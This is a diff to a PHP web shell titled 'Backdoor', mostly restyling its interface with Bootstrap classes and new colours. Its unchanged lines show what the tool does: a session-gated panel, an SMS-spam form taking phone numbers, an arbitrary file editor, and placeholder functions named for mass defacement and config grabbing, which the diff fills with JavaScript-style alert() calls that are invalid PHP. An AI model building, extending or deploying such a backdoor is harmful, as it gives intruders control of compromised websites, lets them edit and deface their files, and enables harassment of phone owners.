@@ -82,16 +82,19 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 ?>
 <!DOCTYPE html>
 <html>
+<head>
 <title>Backdoor</title>
-
 <!-- CSS STYLE-->
+<meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 <style type='text/css'>
 body {
 	background:black;
-	color:white;
+	color:lavender;
 	}
 	@font-face {
 	font-family: 'Orbitron';
@@ -102,11 +105,11 @@ body {
 	}
 	li {display: inline;}
 	a{
-	color:lavender;
+	color:lime;
 	text-decoration:none;
 	}
 	a:hover {
-	color:gold;
+	color:red;
 	}
 	table, tr, td {
 	border:1px solid green;
@@ -115,24 +118,18 @@ body {
 	border: 1px solid green;
 	font-size: 15px;
 	}
-	textarea {
+	#textarea {
 	background-color:black;
 	color:lime;
 	width: 1066px;
 	height: 500px;
-	border: 3px solid #cccccc;
-	padding: 5px;
-	font-family: Tahoma, sans-serif;
-	background-image: url(bg.gif);
-	background-position: bottom right;
-	background-repeat: no-repeat;
+	font-family: Arial, Helvetica, monospace;
+	color:lavender;
 	}
 	#menu {}
-	input[type=submit]{
-		color:black;
-	}
 	*{font-family: 'Orbitron';}
 	</style>
+	</head>
 <?php
 
 // FUNCTION
@@ -146,9 +143,9 @@ function spamsms() {
 <center>
 <h2>Spam SMS</h2>
 <form method="post">
-<textarea name="no" placeholder='No HP ex : 888218005037 ' required></textarea>
+<textarea name="no" class="form-control" id="textarea" placeholder='No HP ex : 888218005037 ' required></textarea>
 <br>
-<input type="submit" name="action"/>
+<input type="submit" name="action" class="btn btn-danger"/>
 </form>
 </center>
 <?php
@@ -182,13 +179,13 @@ endforeach;
 die();
 }
 function jumping() {
-	
+	alert("Kalem euy");
 }
 function config() {
-	
+	alert("Kalem euy");
 }
 function massdeface() {
-	
+	alert("Kalem euy");
 }
 function logout() {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
@@ -209,8 +206,8 @@ $text=file_get_contents($filename);
 <form action="" method="post">
 	<center>
 		<h2>Files Editor : <?php echo $filename;?></h2>
-<textarea name="text"><?php echo htmlspecialchars($text) ?></textarea><br>
-<input type="submit" />
+<textarea name="text" class="form-control" id="textarea"><?php echo htmlspecialchars($text) ?></textarea><br>
+<input type="submit" class="btn btn-danger" />
 </center>
 </form>
 <?php
